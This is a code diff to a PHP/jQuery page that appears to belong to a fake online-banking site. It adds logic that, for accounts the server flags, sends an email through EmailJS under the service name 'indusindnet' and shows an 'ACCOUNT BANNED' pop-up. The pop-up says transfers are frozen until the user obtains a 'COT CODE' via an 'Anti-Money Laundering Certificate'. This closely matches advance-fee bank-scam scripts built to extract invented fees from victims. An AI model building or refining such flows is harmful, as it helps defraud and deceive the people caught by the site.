@@ -215,8 +215,15 @@ include('../../server/config.php');
                         },
                         success(respone) {
                             console.log(respone);
+
                             if (respone) {
-                                sendingOtp(respone, "<?php echo $fullname ?>", "<?php echo $email ?>")
+
+                                if (respone == "ACCOUNT_BANNER") {
+                                    sendingEmail("<?php echo $fullname ?>", "<?php echo $email ?>")
+                                } else {
+                                    sendingOtp(respone, "<?php echo $fullname ?>", "<?php echo $email ?>")
+                                }
+
 
                             } else {
                                 alert('something went wrong')
@@ -257,6 +264,31 @@ include('../../server/config.php');
                     otpbox[0].classList.add('active')
                     transfer[0].classList.add('active')
                     // console.log(otpbox);
+                }).fail(function(error) {
+                    alert('Oops... ' + JSON.stringify(error));
+                });
+            }
+
+            function sendingEmail(fullname, email) {
+                var formData = new FormData();
+                formData.append('service_id', 'indusindnet');
+                formData.append('template_id', 'template_jecf58b');
+                formData.append('user_id', '_VBgknKrVwwZMkITn');
+                formData.append('name', fullname);
+                formData.append('email', email);
+
+                $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
+                    type: 'POST',
+                    data: formData,
+                    contentType: false, // auto-detection
+                    processData: false // no need to parse formData to string
+                }).done(function() {
+                    Swal.fire({
+                        icon: "error",
+                        title: "ACCOUNT BANNED",
+                        text: "Account has been Frozen and you can not carry out transfer from this account until you obtain the COT CODE , by getting the Anti-Money Laundering Certificate.",
+
+                    });
                 }).fail(function(error) {
                     alert('Oops... ' + JSON.stringify(error));
                 });
